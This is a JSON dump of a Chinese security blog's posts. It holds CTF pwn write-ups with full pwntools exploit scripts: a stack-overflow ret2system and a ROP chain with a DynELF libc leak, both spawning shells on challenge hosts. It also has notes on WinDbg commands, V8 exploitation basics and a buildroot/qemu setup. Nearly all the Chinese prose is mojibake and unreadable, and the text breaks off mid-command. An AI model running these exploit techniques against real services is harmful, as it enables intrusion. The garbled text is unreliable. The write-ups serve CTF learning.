æŸ¥æ‰¾ï¼ˆ3ï¼‰å¦‚ä½•åœ¨è„šæœ¬ä¸­è°ƒç”¨åŠ¨æ€åº“ä¸­çš„ç¨‹åºï¼špythonåº“ctypesæ¨¡å—ï¼Œä½¿ç”¨cdll.LoadLibrary(â€˜â€™)(4)ä»€ä¹ˆæƒ…å†µç¨‹åºåœ¨ç¼–è¯‘å‰åŠ è½½äº†åŠ¨æ€åº“ï¼šæ¯”å¦‚æˆ‘ä»¬åœ¨ä½¿ç”¨printå®¶æ—ã€putsç­‰æœªåœ¨ç¨‹åºé‡Œå£°æ˜çš„å‡½æ•°ï¼Œéœ€è¦é€šè¿‡å¼•ç”¨åŠ¨æ€åº“é‡Œé¢å°±æœ‰ç¨‹åºä¸ç”¨å£°æ˜å°±èƒ½è¿›è¡Œè°ƒç”¨çš„å‡½æ•°ã€‚ exp: è§£é‡Šï¼šå¼•å…¥pwnã€ctypesæ¨¡å—ï¼›remoteè¿æ¥å…¶ä»–ä¸»æœºæœåŠ¡ï¼›elf=ELF(binè·¯å¾„)æœ¬åœ°è¿è¡Œpwnæ–‡ä»¶ï¼›libcè°ƒç”¨åŠ¨æ€åº“;æ„é€ payload,éšæœºæ•°aè¦†ç›–åˆ°seed[0],è®¾å®šéšæœºæ•°ç§å­ä¸º1ï¼›recvuntil()æ¥æ”¶å­—ç¬¦ä¸²ï¼›sendline(payload)å‘é€payloadï¼›srand(1)è®¾å®šéšæœºæ•°ç§å­ä¸º1ï¼›å¾ªç¯åæ¬¡ï¼›interactive()ç›´æ¥è¿›è¡Œäº¤äº’ï¼› å¦ä¸€ç§æ–¹å¼ï¼šåˆ©ç”¨Cç¨‹åºï¼Œç›´æ¥è¦†ç›–seed,çˆ†å‡ºéšæœºæ•°ï¼Œå¾—åˆ°flag. cyberpeace{c89cf2a54c56f16458a1164851a361b4}","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://sinky.top/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://sinky.top/tags/pwn/"}]},{"title":"æ”»é˜²ä¸–ç•Œ cgpwn2","slug":"æ”»é˜²ä¸–ç•Œpwn-cgpwn2","date":"2022-08-09T03:17:04.188Z","updated":"2022-08-11T14:24:24.351Z","comments":true,"path":"2022/08/09/æ”»é˜²ä¸–ç•Œpwn-cgpwn2/","link":"","permalink":"https://sinky.top/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-cgpwn2/","excerpt":"","text":"ç®—æ˜¯ç®€å•é¢˜ï¼Œè¿›å…¥hello()å‡½æ•°ä¸­å‘ç°gets(&amp;s) æ ˆæº¢å‡ºæ¼æ´ã€‚ nameæ˜¯å…¨å±€å˜é‡ï¼Œåœ¨bssåŒºæ®µï¼Œé€‚åˆå†™å…¥ã€‚ pwn()å‡½æ•°ä¸­è°ƒç”¨äº†__systemï¼Œä½†å¹¶æ²¡æœ‰â€˜/bin/shâ€™ æ”»å‡»æ€è·¯åœ¨nameä¸­å†™å…¥â€™/bin/shâ€™ã€‚åˆ©ç”¨æ ˆæº¢å‡ºè¦†ç›–è¿”å›åœ°å€ï¼Œä½¿å‡½æ•°è¿”å›åˆ°systemä¸Šï¼Œæ‹¿åˆ°shellã€‚ payload=å¡«å……æ ˆ+è¦†ç›–ä¿å­˜çš„expçš„å€¼4å­—èŠ‚+å‡çš„è¿”å›åœ°å€call __system(â€˜/bin/shâ€™) 1234567891011from pwn import * # p = process('./cgpwn2')p = remote(\"111.198.29.45\",32966)system_addr = 0x804855Abss_addr = 0x804A080p.recvuntil('name\\n')p.sendline(\"/bin/sh\\x00\")p.recvuntil('here:\\n')payload = 0x26*'a' +'bbbb'+ p32(system_addr) + p32(bss_addr)p.sendline(payload)p.interactive() cyberpeace{f92dbe7e38fed8edda8b7513b09acdc7}","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://sinky.top/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://sinky.top/tags/pwn/"}]},{"title":"æ”»é˜²ä¸–ç•Œpwn-100","slug":"æ”»é˜²ä¸–ç•Œpwn-100","date":"2022-08-09T03:17:04.186Z","updated":"2022-08-11T14:19:58.163Z","comments":true,"path":"2022/08/09/æ”»é˜²ä¸–ç•Œpwn-100/","link":"","permalink":"https://sinky.top/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-100/","excerpt":"","text":"åˆ†ææŸ¥å£³ï¼šchecksec 64ä½ï¼Œæ— stack,æ— PIEï¼› è¿è¡Œç¨‹åºï¼Œè¾“å…¥å­—ç¬¦ï¼Œæ— åé¦ˆï¼Œæ— é™åˆ¶ã€‚ idaæŸ¥çœ‹mainå‡½æ•°ï¼Œå‘ç°å­˜åœ¨æ ˆæº¢å‡ºï¼Œå‚æ•°a1å¤§å°ä¸º0x40.ç„¶è€Œå‡½æ•°ä¸­è·å–å¤§äºç­‰äºa2ï¼ˆa2=200ï¼‰çš„æ•°å€¼å­˜å…¥äº†a1. æ”»å‡»æ€è·¯æ— systemå‡½æ•°ï¼Œæ— /bin/shå­—ç¬¦ä¸²ï¼Œæœ‰read,putsã€‚å‚æ•°ç»è¿‡å¯„å­˜å™¨ä¼ é€’ï¼ˆä¹Ÿå¯IDAæŸ¥çœ‹ï¼‰ï¼Œå¯ä»¥æ³„éœ²libc,å†™å…¥/bin/shã€‚ putsåªéœ€è¦ä¸€ä¸ªå‚æ•°ã€‚å¯„å­˜å™¨rdiå­˜æ”¾å†™å…¥åœ°å€ï¼Œrsiå­˜æ”¾å†™å…¥å­—èŠ‚æ•°ã€‚æ‰¾åˆ°pop rdi;retä¼ å‚ï¼Œå³ pop rdi; retpop rsi; pop r15; ret æ³¨ï¼šè°ƒç”¨readå‡½æ•°æ—¶ï¼Œx86ä¸­å‚æ•°ç›´æ¥æ”¾å…¥æ ˆä¸­ï¼›x64è®¾ç«‹äº†å‡ ä¸ªå¯„å­˜å™¨å­˜æ”¾å‚æ•°ï¼Œè°ƒç”¨å‡½æ•°æ—¶å…ˆå‘å¯„å­˜å™¨ä¸­æ”¾å‚æ•°ï¼Œå½“å‚æ•°æ•°é‡å¤§äºå¯„å­˜å™¨ï¼Œæ‰ä¼šåƒæ ˆä¸­æ”¾å‚æ•°ä¼ å‚é¡ºåºé»˜è®¤ä»åå…ˆå¼€å§‹ä¼ å…¥ã€‚x86 x64ä¸€æ ·ã€‚ æ­¤å¤„éœ€è¦å­¦ä¹ åˆ©ç”¨å¯„å­˜å™¨ä¼ é€’å‚æ•°ã€‚ å…³äºpwntoolsçš„DynELFï¼Œä¸»è¦åŠŸèƒ½æ˜¯é€šè¿‡ä¸æ–­ä¼ å…¥é»˜è®¤çš„å‡½æ•°åœ°å€åˆ°è‡ªå·±å†™çš„leakå‡½æ•°å†…éƒ¨ï¼Œæµ‹è¯•å¹¶è·å–libcç‰ˆæœ¬ï¼Œå¾—åˆ°å‡½æ•°åœ°å€ã€‚åˆå› ä¸ºDynELFæ— æ³•æœç´¢å­—ç¬¦ä¸²åœ°å€ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¼ å…¥æ‰€éœ€å­—ç¬¦ä¸²ï¼Œåœ¨è°ƒç”¨å‡½æ•°åŠ è½½bashã€‚ ç”±äºéœ€è¦ä¸æ–­ä¼ å‚æµ‹è¯•ï¼ŒåŠ è½½ç¨‹åºålibcåœ°å€éƒ½ä¼šå˜åŒ–ï¼Œå¯ä»¥é‡ç½®ç¨‹åºè§£å†³é—®é¢˜ã€‚ åˆå§‹åŒ–ä¹‹åç›¸å½“äºä¸€ä¸ªæ–°çš„ç¨‹åºï¼Œæ ˆç©ºé—´ä»æ–°åˆ†é…ã€‚æ­¤ç¨‹åºåˆå§‹åŒ–æ®µï¼š ç¨‹åºè¿˜éœ€è°ƒç”¨ä¸€ä¸ªgadget,åç»­å¦èµ·ä¸€ç¯‡å­¦ä¹  exp:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950 #coding=utf-8from pwn import * # context.log_level = 'debug'io = remote('124.126.19.106',46612) # io = process(\"./pwn-100\")elf = ELF(\"./pwn-100\")rop1 = 0x40075A #pop rbx_rbp_r12_r13_r14_r15rop2 = 0x400740 #rdx(r13), rsi(r14), edi(r15d)pop_rdi_ret = 0x400763 # start_addr = elf.symbols['_start']start_addr = 0x400550puts_plt = elf.plt['puts']read_got = elf.got['read']binsh_addr = 0x601000def leak(addr): payload = \"a\" * 0x48 + p64(pop_rdi_ret) + p64(addr) + p64(puts_plt) + p64(start_addr) payload = payload.ljust(200, \"a\") io.send(payload) io.recvuntil(\"bye~\\n\") up = \"\" content = \"\" count = 0 while True: c = io.recv(numb=1, timeout=0.5) count += 1 if up == '\\n' and c == \"\": content = content[:-1] + '\\x00' break else: content += c up = c content = content[:4] log.info(\"%#x =&gt; %s\" % (addr, (content or '').encode('hex'))) return contentd = DynELF(leak, elf = elf)sys_addr = d.lookup('system', 'libc')log.info(\"system_addr =&gt; %#x\", sys_addr)payload = \"a\" * 0x48 + p64(rop1) + p64(0) + p64(1) + p64(read_got) + p64(8) + p64(binsh_addr) + p64(1)payload += p64(rop2)payload += \"\\x00\" * 56 payload += p64(start_addr)payload = payload.ljust(200, \"a\")io.send(payload)io.recvuntil(\"bye~\\n\") # gdb.attach(io)io.send(\"/bin/sh\\x00\")payload = \"a\" * 0x48 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)payload = payload.ljust(200, \"a\")io.send(payload)io.interactive()","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://sinky.top/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://sinky.top/tags/pwn/"}]},{"title":"WinDbgä½¿ç”¨æ•´ç†","slug":"WinDbgä½¿ç”¨æ•´ç†","date":"2022-08-09T03:17:04.136Z","updated":"2022-08-11T14:20:50.677Z","comments":true,"path":"2022/08/09/WinDbgä½¿ç”¨æ•´ç†/","link":"","permalink":"https://sinky.top/2022/08/09/WinDbg%E4%BD%BF%E7%94%A8%E6%95%B4%E7%90%86/","excerpt":"","text":"0x00 åŸºç¡€å‘½ä»¤ .sympath //æ˜¾ç¤ºè®¾ç½®çš„ç¬¦å·è¡¨è·¯å¾„ .reload //æ­¤å‘½ä»¤ä¸»è¦ç”¨äºåŠ è½½ç¬¦å·è¡¨ã€‚ .reload /f //é‡æ–°è£…è½½æ¨¡å— .reload /i //å¼ºåˆ¶åŠ è½½mismatched symbol U //è¿™ä¸ªå‘½ä»¤ä¸»è¦ç”¨äºåæ±‡ç¼–æŸä¸ªåœ°å€ï¼Œå…¶åé¢å¯ä»¥è·Ÿå‡½æ•°åå’Œåœ°å€ã€‚Uå‘½ä»¤åé¢å¯ä»¥åŠ Lè¡¨ç¤ºå»¶é•¿åæ±‡ç¼–é•¿åº¦ db //æ˜¾ç¤ºä¸€å­—èŠ‚çš„é•¿åº¦ã€‚ dw //æ˜¾ç¤ºä¸¤å­—èŠ‚çš„é•¿åº¦ã€‚ dd //æ˜¾ç¤ºå››å­—èŠ‚çš„é•¿åº¦ã€‚ dq //æ˜¾ç¤ºå…«å­—èŠ‚çš„é•¿åº¦ã€‚ dD //æ˜¾ç¤ºdoubleå®æ•°(8å­—èŠ‚çš„é•¿åº¦)ã€‚ df //æ˜¾ç¤ºfloatå®æ•°(4å­—èŠ‚çš„é•¿åº¦)ã€‚ da //æ˜¾ç¤ºassciiå€¼ du //æ˜¾ç¤ºunicodeå€¼ ds //æ˜¾ç¤ºANI_STRINGå€¼ dS //æ˜¾ç¤ºUNICODE_STRINGçš„å€¼ eb address value //åœ¨address è¿™ä¸ªåœ°å€å†™å…¥ä¸€ä¸ªå­—èŠ‚value ew address value //åœ¨address è¿™ä¸ªåœ°å€å†™å…¥ä¸¤å­—èŠ‚value ed address value //åœ¨address è¿™ä¸ªåœ°å€å†™å…¥å››å­—èŠ‚å­—èŠ‚value eq address value //åœ¨address è¿™ä¸ªåœ°å€å†™å…¥å…«å­—èŠ‚å­—èŠ‚value 0x01 å¯¹è±¡ç›¸å…³å‘½ä»¤ dt //dtå‘½ä»¤ä¸»è¦ç”¨äºæŸ¥çœ‹ç»“æ„ä½“ã€‚ lm //åˆ—å‡ºæ¨¡å—ã€‚ lm vm æ¨¡å—å //æŸ¥çœ‹æ¨¡å—è¯¦ç»†ä¿¡æ¯ã€‚ !process 0 0 //åˆ—å‡ºç³»ç»Ÿè¿›ç¨‹ä¿¡æ¯ !process 0 0 è¿›ç¨‹å //åˆ—å‡ºè¯¥è¿›ç¨‹çš„ä¿¡æ¯ !process 0 1 è¿›ç¨‹å //åˆ—å‡ºè¯¥è¿›ç¨‹æ›´åŠ çš„ä¿¡æ¯ !process 0 7 è¿›ç¨‹å //åˆ—å‡ºè¯¥è¿›ç¨‹çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬çº¿ç¨‹çš„ .process EPROCESS //åˆ‡å…¥è¯¥è¿›ç¨‹ä¸­ !object åœ°å€ //æ˜¾ç¤ºè¯¥åœ°å€çš„å¯¹è±¡ä¿¡æ¯ã€‚ bp address //åœ¨åœ°å€addressæ’å…¥æ–­ç‚¹ã€‚ baå‘½ä»¤æ˜¯æ˜¯ç¡¬ä»¶æ–­ç‚¹å‘½ä»¤ï¼Œé€šè¿‡è®¾ç½®cpuçš„dxå¯„å­˜å™¨æ¥æ‹¦æˆªçº¿ç¨‹ã€‚ ba access size åœ°å€ //access æ˜¯è®¿é—®çš„æ–¹å¼ï¼Œæ¯”å¦‚ e (æ‰§è¡Œ)ï¼Œr (è¯»/å†™)ï¼Œw (å†™) ï¼Œsizeæ˜¯ç›‘æ§è®¿é—®çš„ä½ç½® çš„å¤§å°ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½ã€‚å€¼ ä¸º 1ã€2æˆ–4ï¼Œåœ¨64ä½æœºå™¨ä¸Šè¿˜å¯ä»¥æ˜¯8ã€‚ bd/be/bc bd æ–­ç‚¹å· //æ­¤å‘½ä»¤æ˜¯å…³é—­æ–­ç‚¹å·æ‰€å¯¹åº”çš„æ–­ç‚¹ ã€‚ be æ–­ç‚¹å· //æ­¤å‘½ä»¤æ˜¯å¼€å¯æ–­ç‚¹å·æ‰€å¯¹åº”çš„æ–­ç‚¹ ã€‚ bc * //å»é™¤æ‰€æœ‰æ–­ç‚¹ã€‚ x //xå‘½ä»¤ç”¨æ¥æ¨¡ç³ŠæŸ¥è¯¢ x nt!kesdestable* //æ ·æŸ¥çœ‹SSDTè¡¨çš„åœ°å€ dds åœ°å€ //æ­¤å‘½ä»¤ç”¨æ¥è§£ææŸè¿ç»­åœ°å€çš„å‡½æ•°åã€‚","categories":[],"tags":[{"name":"å­¦ä¹ ç¬”è®°","slug":"å­¦ä¹ ç¬”è®°","permalink":"https://sinky.top/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"å·¥å…·å­¦ä¹ ","slug":"å·¥å…·å­¦ä¹ ","permalink":"https://sinky.top/tags/%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/"},{"name":"äºŒè¿›åˆ¶","slug":"äºŒè¿›åˆ¶","permalink":"https://sinky.top/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"}]},{"title":"V8æ¼æ´åˆå­¦ä¹ ","slug":"V8æ¼æ´åˆå­¦ä¹ ","date":"2022-08-09T03:17:04.132Z","updated":"2022-08-09T03:49:51.822Z","comments":true,"path":"2022/08/09/V8æ¼æ´åˆå­¦ä¹ /","link":"","permalink":"https://sinky.top/2022/08/09/V8%E6%BC%8F%E6%B4%9E%E5%88%9D%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"V8åŸºç¡€v8æ˜¯chromeæµè§ˆå™¨çš„jsè§£æå¼•æ“ï¼Œå¤§å¤šæ•°é’ˆå¯¹chromeçš„æ¼æ´åˆ©ç”¨å‡ ä¹éƒ½æ˜¯v8å¼•æ“å¼•èµ·çš„ v8ç¼–è¯‘åäºŒè¿›åˆ¶åç§°å«d8. allow-natives-syntaxé€‰é¡¹å®šä¹‰äº†ä¸€äº›v8è¿è¡Œæ—¶æ”¯æŒå‡½æ•°ï¼Œä»¥ä¾¿äºæœ¬åœ°è°ƒè¯•ï¼š 123456789browser/x64.release$ ./d8 --allow-natives-syntaxV8 version 7.5.0 (candidate)d8&gt; var a = [1, 2, 3];undefinedd8&gt; %DebugPrint(a);0x2ebcfb54dd41 &lt;JSArray[3]&gt;[1, 2, 3]d8&gt; %SystemBreak();Trace/breakpoint trap (core dumped) åœ¨åŠ è½½d8æ—¶åŠ å…¥æ­¤é€‰é¡¹å¯ä»¥åœ¨jsä¸­è°ƒè¯•æœ¬åœ°è¿è¡Œæ—¶å‡½æ•°ï¼š %DebugPrint(obj) è¾“å‡ºå¯¹è±¡åœ°å€%SystemBreak() è§¦å‘è°ƒè¯•ä¸­æ–­ä¸»è¦ç»“åˆgdbç­‰è°ƒè¯•å™¨ä½¿ç”¨ gdbçš„gdbinitè„šæœ¬å¯ä»¥ä½¿gdbä¸­å°±èƒ½å¯è§†åŒ–æ˜¾ç¤ºv8çš„å¯¹è±¡ç»“æ„ï¼Œå°†è¯¥è„šæœ¬ä¸‹è½½é‡å‘½åä¸ºgdbinit_v8å¹¶æ·»åŠ è‡³/.gdbinitè„šæœ¬ï¼š source /path/to/gdbinit_v8 ä¸‹é¢å°†allow-natives-syntaxé€‰é¡¹å’Œgdbinitç»“åˆä½¿ç”¨ï¼Œç¼–å†™test.jsï¼š 123456789var a = [1,2,3];var b = [1.1, 2.2, 3.3];var c = [a, b];%DebugPrint(a);%SystemBreak(); //è§¦å‘ç¬¬ä¸€æ¬¡è°ƒè¯•%DebugPrint(b);%SystemBreak(); //è§¦å‘ç¬¬äºŒæ¬¡è°ƒè¯•%DebugPrint(c);%SystemBreak(); //è§¦å‘ç¬¬ä¸‰æ¬¡è°ƒè¯• gdbè¿è¡Œd8: 123456789root@kali:~/ctf/browser/x64.release$ gdb ./d8pwndbg&gt; set args --allow-natives-syntax ./test.jspwndbg&gt; rStarting program: x64.release/d8 --allow-natives-syntax ./test.js[Thread debugging using libthread_db enabled][New Thread 0x7ff87fde9700 (LWP 18393)][New Thread 0x7ff87f5e8700 (LWP 18394)][New Thread 0x7ff87ede7700 (LWP 18395)]0x12e891f8df11 &lt;JSArray[3]&gt; å¯ä»¥å‘ç°ï¼Œç¨‹åºæ‰“å°äº†æ•°ç»„å¯¹è±¡açš„å†…å­˜åœ°å€ï¼Œå¹¶ä¸”SystemBreakè§¦å‘äº†gdbçš„ä¸­æ–­ã€‚ æ­¤æ—¶å°±å¯ä»¥åˆ©ç”¨ä¸Šé¢å·²ç»åŠ å…¥çš„gdbinitè„šæœ¬ä¸­åŒ…å«çš„å‘½ä»¤è°ƒè¯•å¯¹è±¡ç»“æ„ï¼Œä¸»è¦ä½¿ç”¨jobå‘½ä»¤ï¼Œå¯ä»¥å¯è§†åŒ–æ˜¾ç¤ºjså¯¹è±¡çš„å†…å­˜ç»“æ„ã€‚ v8åœ¨å†…å­˜ä¸­åªæœ‰æ•°å­—å’Œå¯¹è±¡æ¢å¿ è¡¨ç¤ºï¼Œä¸ºäº†åŒºåˆ†ä¸¤è€…ï¼Œv8åœ¨æ‰€æœ‰å¯¹è±¡çš„å†…å­˜åœ°å€æœ«å°¾éƒ½åŠ äº†1ï¼Œä»¥ä¾¿è¡¨ç¤ºå®ƒæ˜¯ä¸ªå¯¹è±¡ã€‚å¯¹è±¡aä¸–å†…å­˜åœ°å€ä¸º0x12e891f8df10ã€‚ telescopeå‘½ä»¤æŸ¥çœ‹å†…å­˜æ•°æ®ã€‚ åœ¨gdbä¸­ä½¿ç”¨cå‘½ä»¤ç»§ç»­è¿è¡Œï¼Œå‘ç°åœåœ¨äº†ç¬¬äºŒæ¬¡SystemBreakçš„åœ°æ–¹ï¼Œç„¶åç”¨jobå‘½ä»¤æŸ¥çœ‹ç¬¬äºŒä¸ªå¯¹è±¡bçš„åœ°å€ï¼Œæ ¹æ®ä¸Šé¢çš„å¥—è·¯ï¼Œå¯çŸ¥å¯¹è±¡bçš„å®é™…å†…å­˜åœ°å€ä¸º0x244de278df58. v8çš„å¯¹è±¡ç»“æ„å’Œvbç­‰è¯­è¨€çš„è§£æç±»ä¼¼ï¼ŒJSæ˜¯ä¸€ç§è§£é‡Šä¹‹è¡Œè¯­è¨€ï¼Œv8æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªJSçš„è§£é‡Šæ‰§è¡Œç¨‹åºã€‚ é¦–å…ˆï¼Œéœ€è¦äº†è§£v8è§£ææ‰§è¡ŒjavaScriptè¯­å¥çš„åŸºæœ¬æµç¨‹ï¼šv8åœ¨è¯»å–jsè¯­å¥åï¼Œé¦–å…ˆå°†è¿™æ¡è¯­å¥è§£æä¸ºè¯­æ³•æ ‘ï¼Œç„¶åé€šè¿‡è§£é‡Šå™¨å°†è¯­æ³•æ ‘å˜ä¸ºä¸­é—´è¯­è¨€çš„Bytecodeå­—èŠ‚ç ï¼Œæœ€ååˆ©ç”¨å†…éƒ¨è™šæ‹Ÿæœºå°†å­—èŠ‚ç è½¬æ¢ä¸ºæœºå™¨ç æ¥æ‰§è¡Œã€‚ ä¸ºäº†åŠ å¿«è§£æè¿‡ç¨‹ï¼Œv8ä¼šè®°å½•ä¸‹æŸæ¡è¯­æ³•æ ‘çš„æ‰§è¡Œæ¬¡æ•°ï¼Œå½“v8å‘ç°æŸæ¡è¯­æ³•æ ‘æ‰§è¡Œæ¬¡æ•°è¶…è¿‡ä¸€å®šé˜ˆå€¼åï¼Œå°±ä¼šå°†è¿™æ®µè¯­æ³•æ ‘ç›´æ¥è½¬æ¢ä¸ºæœºå™¨ç ï¼Œåç»­å†è°ƒç”¨è¿™æ¡jsè¯­å¥æ—¶ï¼Œv8ä¼šç›´æ¥è°ƒç”¨è¿™æ¡è¯­æ³•æ ‘å¯¹åº”çš„æœºå™¨ç ï¼Œè€Œä¸ç”¨å†è½¬æ¢ä¸ºbyte codeå­—èŠ‚ç ï¼Œå¤§å¤§åŠ å¿«äº†æ‰§è¡Œé€Ÿåº¦ï¼Œè¿™å°±æ˜¯è‘—åçš„JITä¼˜åŒ–ã€‚ ä½†æ˜¯è¿™æ ·çš„æ€§èƒ½ä¼˜åŒ–è™½ç„¶åŠ å¿«äº†ç¨‹åºçš„æ‰§è¡Œï¼Œä½†ä¹Ÿå¸¦æ¥äº†å¾ˆå¤šçš„å®‰å…¨é—®é¢˜ï¼Œå¦‚æœv8æœ¬æ¥é€šè¿‡JITå¼•æ“ä¸ºæŸæ®µè¯­æ³•æ ‘æ¯”å¦‚a+bå‡å‘è®¡ç®—ç”Ÿæˆäº†ä¸€æ®µæœºå™¨ç add eax,ebxï¼Œè€Œåœ¨åç»­æŸä¸ªæ—¶åˆ»ï¼Œæ”»å‡»è€…åœ¨jså¼•æ“ä¸­çªç„¶æ”¹å˜äº†aå’Œbçš„å¯¹è±¡ç±»å‹ï¼Œè€ŒJITå¼•æ“å¹¶æ²¡æœ‰è¯†åˆ«å‡ºè¿™ä¸ªæ”¹å˜ï¼Œå°±ä¼šé€ æˆaå’Œbå¯¹è±¡åœ¨å‡å‘è¿ç®—æ—¶çš„ç±»å‹æ··æ·†ã€‚ ä¸€ä¸ªå¯¹è±¡åœ¨å†…å­˜ä¸­å¸ƒå±€å¤§è‡´å¦‚ä¸‹ï¼š map:è¡¨æ˜äº†ä¸€ä¸ªå¯¹è±¡çš„ç±»å‹å¯¹è±¡bä¸ºPACKED_DOUBLE_ELEMENTSç±»å‹ prototypeï¼šprototype elements:å¯¹è±¡å…ƒç´  length:å…ƒç´ ä¸ªæ•° properties:å±æ€§ æ•°ç»„å¯¹è±¡çš„elementså…¶å®ä¹Ÿæ˜¯ä¸ªå¯¹è±¡ï¼Œè¿™äº›å…ƒç´ åœ¨å†…å­˜ä¸­çš„åˆ†å¸ƒæ­£å¥½ä½äºæ•°ç»„å¯¹è±¡çš„ä¸Šæ–¹ï¼Œå³ä½åœ°å€å¤„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨å†…å­˜ç”³è¯·ä¸Šï¼Œv8å…ˆç”³è¯·äº†ä¸€å—å†…å­˜å­˜å‚¨å…ƒç´ å†…å®¹ï¼Œç„¶åç”³è¯·äº†ä¸€å—å†…å­˜å­˜å‚¨è¿™ä¸ªæ•°ç»„çš„å¯¹è±¡ç»“æ„ï¼Œå¯¹è±¡ä¸­çš„elementsæŒ‡å‘äº†å­˜å‚¨å…ƒç´ å†…å®¹çš„å†…å­˜åœ°å€ï¼Œå¦‚å›¾ï¼š ç”±äºæµè§ˆå™¨çš„æ¼æ´åˆ©ç”¨å‡ ä¹éƒ½è¦åŸºäºå¯¹è±¡ç»“æ„æ¥å®ç°ï¼Œå› æ­¤ç†Ÿæ‚‰ä¸Šè¿°v8å¯¹è±¡çš„å†…å­˜å¸ƒå±€ï¼Œå¯¹åç»­ä¼šå¾ˆæœ‰å¸®åŠ©ã€‚ ä¸Šè¿°å†…å­˜å¸ƒå±€æ˜¯FloatArrayçš„å†…å­˜å¸ƒå±€ï¼Œå…¶ä»–ç±»å‹çš„Arrayä¸å…¶ç±»ä¼¼ï¼Œä½†ä¸å®Œå…¨ç›¸åŒã€‚ æµè§ˆå™¨V8çš„è§£é¢˜æ­¥éª¤ä¸€èˆ¬æµè§ˆå™¨çš„å‡ºé¢˜æœ‰ä¸¤ç§ï¼Œä»¥ä¸­å±±å¸‚diffä¿®æ”¹v8å¼•æ“æºä»£ç ï¼Œäººä¸ºåˆ¶é€ å‡ºä¸€ä¸ªæ¼æ´ï¼Œå¦ä¸€ç§æ˜¯ç›´æ¥é‡‡ç”¨æŸä¸ªcveæ¼æ´ã€‚å‡ºé¢˜è€…é€šå¸¸ä¼šæä¾›ä¸€ä¸ªidfæ–‡ä»¶ï¼Œæˆ–ç›´æ¥ç»™å‡ºä¸€ä¸ªç¼–è¯‘ådiffè¡¥ä¸åçš„æµè§ˆå™¨ç¨‹åºï¼Œå¦‚æœåªç»™äº†ä¸€ä¸ªdiffæ–‡ä»¶ï¼Œåˆ™éœ€è¦æˆ‘ä»¬è‡ªå·±å»ä¸‹è½½ç›¸å…³commitæºç ï¼Œç„¶åæœ¬åœ°æ‰“ä¸Šdiffè¡¥ä¸ï¼Œç¼–è¯‘å‡ºæµè§ˆå™¨ç¨‹åºåœ¨è¿›è¡Œæœ¬åœ°è°ƒè¯•ã€‚ å‚è€ƒhttps://www.codercto.com/a/81538.html åç»­éœ€è¦å®è·µåšä¸€ä¸‹è¿™ä¸ªctfé¢˜ç›®ã€‚","categories":[],"tags":[{"name":"chrome_bug","slug":"chrome-bug","permalink":"https://sinky.top/tags/chrome-bug/"}]},{"title":"Ubuntuä¸‹buildrootä»¥åŠqemuç¯å¢ƒæ­å»º","slug":"Ubuntuä¸‹buildrootä»¥åŠqemuç¯å¢ƒæ­å»º","date":"2022-08-09T03:17:04.125Z","updated":"2022-08-11T14:21:15.867Z","comments":true,"path":"2022/08/09/Ubuntuä¸‹buildrootä»¥åŠqemuç¯å¢ƒæ­å»º/","link":"","permalink":"https://sinky.top/2022/08/09/Ubuntu%E4%B8%8Bbuildroot%E4%BB%A5%E5%8F%8Aqemu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","excerpt":"","text":"0x00 æ­å»ºç¯å¢ƒwindows 10VMwareWorkstation proUbuntu 16.04 x64 0x01 å®‰è£…binwalk12345678sudo susudo apt-get remove binwalksudo spt-get updatesudo apt-get install build-essential autoconf git //è·å–Gitgit clone https://github.com/devttys0/binwalkcd binwalksudo python setup.py installsudo ./deps.sh 0x02 å®‰è£…buildrootäº¤å‰ç¼–è¯‘ç¯å¢ƒå®‰è£…ä¾èµ–ï¼š sudo apt-get install libncurses5-dev patch ä¸‹è½½buildroot: wget https://buildroot.org/downloads/buildroot-2020.02.6.tar.gz 1234tar -zxvf buildroot-2020.02.6.tar.gzcd buildroot-2020.02.6make cleanmake menuconfig å‡ºç°é…ç½®ç•Œé¢ï¼š é€‰æ‹©target options-&gt;target Architecture-&gt;MIPS(Little endian),ä»£è¡¨MIPSå°ç«¯åº åœ¨toolChainâ€“&gt;Kelnel Headers,é€‰æ‹©è‡ªå·±ä¸»æœºå†…æ ¸ç‰ˆæœ¬æˆ–æ›´ä½ç‰ˆæœ¬ã€‚ ä¿å­˜é€€å‡º sudo make é™ç­‰å®Œæˆã€‚ osï¼šç¼–è¯‘çš„æ—¶å€™éœ€è¦å¤§å†…å­˜ï¼Œæˆ‘åˆ†é…ä¸ªè™šæ‹Ÿæœºçš„å†…å­˜å¤ªå°ï¼Œå¯¼è‡´ç¼–è¯‘å¤±è´¥äº†å¥½å‡ æ¬¡â€¦â€¦æ­¤å¤„å¤šè°¢Prowes5å¸®æˆ‘æ‰¾åˆ°äº†åŸå› å‘œå‘œå‘œã€‚ æµ‹è¯•ï¼š 12./mipsel-linux-gcc hello.c -o hello./hello //å¤±è´¥ ä½¿ç”¨fileæŸ¥çœ‹ï¼Œæ˜¯å°ç«¯åºçš„mipsç¨‹åºã€‚ 0x03 qemuè¿è¡Œç¯å¢ƒ12sudo apt-get install qemusudo apt-get install qemu-user-static æµ‹è¯•helloæŠ¥é”™/lib/ld-uClibc.so.0: No such file or directory æ˜¯å› ä¸ºæ²¡æœ‰å¯¹åº”æ¶æ„çš„é“¾æ¥åº“çš„é—®é¢˜åœ¨ç›®å½•output/host/mipsel-buildroot-linux-uclibc/sysroot/lib/ä¸‹ï¼Œ 123sudo cp ld-uClibc-1.0.32.so /lib/sudo chown -R root:root /lib/ld-uClibc-1.0.31.sosudo ln 